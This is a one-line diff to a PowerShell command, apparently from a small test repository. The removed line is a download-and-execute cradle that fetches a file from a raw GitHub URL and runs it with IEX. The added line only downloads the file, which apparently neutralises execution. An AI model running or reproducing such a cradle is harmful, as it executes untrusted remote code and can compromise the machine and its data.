@@ -1,1 +1,1 @@
-IEX (new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/u0buzz/psTest/main/tmp')
+(new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/u0buzz/psTest/main/tmp')
